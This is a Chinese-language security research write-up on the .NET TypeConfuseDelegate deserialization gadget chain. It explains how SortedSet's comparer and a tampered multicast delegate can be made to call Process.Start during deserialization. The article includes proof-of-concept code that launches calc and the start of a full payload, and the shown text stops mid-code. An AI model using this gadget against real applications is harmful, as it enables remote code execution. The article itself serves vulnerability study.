**作者：HuanGMz@知道创宇404实验室  
时间：2020年11月30日**
## 一.TypeConfuseDelegate工具链
> TypeConfuseDelegate 工具链
> 利用了SortedSet类在反序列化时调用比较器进行排序，以及多播委托可以修改委托实例的特点实现在反序列化时执行代码
### 0x10 基础知识
#### 0x11 SortedSet
SortedSet 从其名字就可以看出其用处，可排序的set，表示按排序顺序维护的对象的集合。 为泛型用法，T表示集合中元素的类型。
既然是可排序的，那么集合中的元素要依据什么进行排序呢？我们看一个SortedSet 的例子就知道了：
    // Defines a comparer to create a sorted set
    // that is sorted by the file extensions.
    public class ByFileExtension : IComparer
    {
        string xExt, yExt;
        CaseInsensitiveComparer caseiComp = new CaseInsensitiveComparer();
        public int Compare(string x, string y)
        {
            // Parse the extension from the file name.
            xExt = x.Substring(x.LastIndexOf(".") + 1);
            yExt = y.Substring(y.LastIndexOf(".") + 1);
            // Compare the file extensions.
            int vExt = caseiComp.Compare(xExt, yExt);
            if (vExt != 0)
            {
                return vExt;
            }
            else
            {
                // The extension is the same,
                // so compare the filenames.
                return caseiComp.Compare(x, y);
            }
        }
    }
    ...
    // Create a sorted set using the ByFileExtension comparer.
    var set = new SortedSet(new ByFileExtension());
    set.Add("hello.a");
    set.Add("hello.b");
可以看到，在实例化 SortedSet类的时候，指定当前集合中元素类型为string，同时传入了一个 ByFileExtension 实例 做为初始化参数。
ByFileExtension 类是一个“比较器”，专门提供给 SortedSet 用于排序。其类型继承于 IComparer 接口。
我们看一下SortedSet 的初始化函数:
    IComparer comparer;
    ...
    public SortedSet(IComparer comparer) {
        if (comparer == null) {
            this.comparer = Comparer.Default;
        } else {
            this.comparer = comparer;
        }
    }
可以看到，传入的比较器被存储在 comparer字段中，该字段类型也为 IComparer 类型。
**Icomparer **
    public interface IComparer
    {
        // Compares two objects. An implementation of this method must return a
        // value less than zero if x is less than y, zero if x is equal to y, or a
        // value greater than zero if x is greater than y.
        // 
        int Compare(T x, T y);
    }
这是一个接口类型，定义了一个Comparer() 方法，该方法用于比较同类型的两个对象，规定返回结果为int型。
上面例子中的 ByFileExtension 类型便继承于 IComparer，其实现了Compare方法，用于比较两个string 对象。
SortedSet 便是利用这样一个比较器来给同类型的两个对象排序。
回到SortedSet 的用法:
    set.Add("hello.a");
    set.Add("hello.b");
其通过调用Add方法来给集合添加元素。这里有一个细节，在第一次Add时不会调用比较器，从第二次Add才开始调用比较器（合理）。
#### 0x12 ComparisonComparer
**Comparer **
Comparer 是 Icomparer接口的一个实现，其源码如下：
    public abstract class Comparer : IComparer, IComparer
    {
        static readonly Comparer defaultComparer = CreateComparer(); 
        public static Comparer Default {
            get {
                Contract.Ensures(Contract.Result>() != null);
                return defaultComparer;
            }
        }
        public static Comparer Create(Comparison comparison)
        {
            Contract.Ensures(Contract.Result>() != null);
            if (comparison == null)
                throw new ArgumentNullException("comparison");
            return new ComparisonComparer(comparison);
        }
        ...
        public abstract int Compare(T x, T y);
        int IComparer.Compare(object x, object y) {
            if (x == null) return y == null ? 0 : -1;
            if (y == null) return 1;
            if (x is T && y is T) return Compare((T)x, (T)y);
            ThrowHelper.ThrowArgumentException(ExceptionResource.Argument_InvalidArgumentForComparison);
            return 0;
        }
    }
我们重点关注 Comparer.Create() 函数，该函数创建了一个 ComparisonComparer 类型，并将其返回。
我们看一下 ComparisonComparer 类型是啥？
    [Serializable]
    internal class ComparisonComparer : Comparer
    {
        private readonly Comparison _comparison;
        public ComparisonComparer(Comparison comparison) {
            _comparison = comparison;
        }
        public override int Compare(T x, T y) {
            return _comparison(x, y);
        }
    }
这是一个可序列化的类型，其继承于 Comparer，所以也是一个比较器。
我们关注其用于比较的函数Compare()，该函数直接调用了 _comparison() 函数。而_comparison
字段是一个Comparison 类型，在初始化时被传入并设置。Comparison 是什么类型？
    public delegate int Comparison(T x, T y);
原来这是一个委托类型，其函数签名与比较函数相同。
目前为止，我们应认识到ComparisonComparer 有如下的关键：
  * 是一个比较器，且比较函数可自定义
  * 可序列化
### 0x20 SortedSet 的反序列化
在SortedSet 类里，有一个OnDeserialization 函数:
    void IDeserializationCallback.OnDeserialization(Object sender) {
        OnDeserialization(sender);
    }
    protected virtual void OnDeserialization(Object sender) {
        if (comparer != null) {
            return; //Somebody had a dependency on this class and fixed us up before the ObjectManager got to it.
        }
        if (siInfo == null) {
            ThrowHelper.ThrowSerializationException(ExceptionResource.Serialization_InvalidOnDeser);
        }
        comparer = (IComparer)siInfo.GetValue(ComparerName, typeof(IComparer));
        int savedCount = siInfo.GetInt32(CountName);
        if (savedCount != 0) {
            T[] items = (T[])siInfo.GetValue(ItemsName, typeof(T[]));
            if (items == null) {
                ThrowHelper.ThrowSerializationException(ExceptionResource.Serialization_MissingValues);
            }
            for (int i = 0; i 对象，即this，然后调用Add方法来添加元素。我们前面已经知道使用Add方法添加第二个元素时就会开始调用比较函数。也就是说，在反序列化SortedSet
时，会触发SortedSet排序，进而调用设置的比较器中的比较函数。
由于我们可以设置比较函数，而且传给比较函数的两个参数就是Add的前两个string 元素(可控)，那么如果将比较函数设置为Process.Start()
函数，我们就可以实现代码执行了。
### 0x30 构造payload
对于SortedSet 类来说，其比较函数类型为：
    int Comparison(T x, T y);
而Process.Start()中比较相似的是：
    public static Process Start(string fileName, string arguments);
但是其返回值类型为 Process类型，仍然与比较函数不同。如果我们直接将比较器的比较函数替换为Process.Start会导致在序列化时失败。
那么要如何做？可以借多播委托来替换调用函数，如下：
    static void TypeConfuseDelegate(Comparison comp)
    {
        FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList",
                BindingFlags.NonPublic | BindingFlags.Instance);
        object[] invoke_list = comp.GetInvocationList();
        // Modify the invocation list to add Process::Start(string, string)
        invoke_list[1] = new Func(Process.Start);
        fi.SetValue(comp, invoke_list);
    }
    static void Main(string[] args)
    {
        // Create a simple multicast delegate.
        Delegate d = new Comparison(String.Compare);
        Comparison c = (Comparison)MulticastDelegate.Combine(d, d);
        // Create set with original comparer.
        IComparer comp = Comparer.Create(c);
        TypeConfuseDelegate(c);
        ...
    }
MulticastDelegate
即多播委托。所谓多播，就是将多个委托实例合并为一个委托，即多播委托。在调用多播委托时，会依次调用调用列表里的委托。在合并委托时只能合并同类型的委托。
我们先看 MulticastDelegate.Combine函数，该函数继承自 delegate类型：
    public static Delegate Combine(Delegate a, Delegate b)
    {
        if ((Object)a == null) // cast to object for a more efficient test
            return b;
        return  a.CombineImpl(b);
    }
跟入 CombineImpl():
    protected override sealed Delegate CombineImpl(Delegate follow)
    {
        if ((Object)follow == null) // cast to object for a more efficient test
            return this;
        // Verify that the types are the same...
        if (!InternalEqualTypes(this, follow))
            throw new ArgumentException(Environment.GetResourceString("Arg_DlgtTypeMis"));
        MulticastDelegate dFollow = (MulticastDelegate)follow;
        Object[] resultList;
        int followCount = 1;
        Object[] followList = dFollow._invocationList as Object[];
        if (followList != null)
            followCount = (int)dFollow._invocationCount; 
        int resultCount;
        Object[] invocationList = _invocationList as Object[];
        if (invocationList == null)
        {
            resultCount = 1 + followCount;
            resultList = new Object[resultCount];
            resultList[0] = this;
            if (followList == null)
            {
                resultList[1] = dFollow;
            }
            else
            {
                for (int i = 0; i (Process.Start)。_invocationList 是object[] 类型，所以不会报错。
而在调用多播委托时，由于输入参数类型相同，所以也不会造成问题。实际上，这与c语言中通过函数指针调用函数的问题相同，涉及到的是函数调用约定的问题。比如我将要替换的委托实例由
Process.Start 改为如下：
    static int compfunc(ulong a, ulong b)
    {
        Console.WriteLine("{0:X}", a);
        Console.WriteLine("{0:X}", b);
        Process.Start("calc");
        return 1;
    }
    invoke_list[1] = new Func(compfunc);
ulong 为64位无符号类型，这时查看打印的数据以及对应内存（Add的数据分别是"calc" 和 "adummy"）：
很明显，通过多播委托调用委托实例时，传递过去的是两个sring对象，而委托以ulong类型接收。在内存中查看ulong变量所存放的地址，很明显是string对象。所以在调用委托时，传递的其实是两个string对象的指针，我们完全可以以64位的ulong类型正常接收。这涉及到C#
底层的调用约定，我没有了解过，这里就不再多说。
完整的payload（来自 James Forshaw）：
    using System;
    using System.Collections.Generic;
    using System.Runtime.Serialization.Formatters.Binary;
    using System.IO;
    using System.Reflection;
    using System.Diagnostics;
    namespace SortedListTest
    {
        class Program
        {
            static int compfunc(string a, string b)
            {
                Process.Start(a, b);
                return 1;
            }
            static void TypeConfuseDelegate(Comparison comp)
            {
                FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList",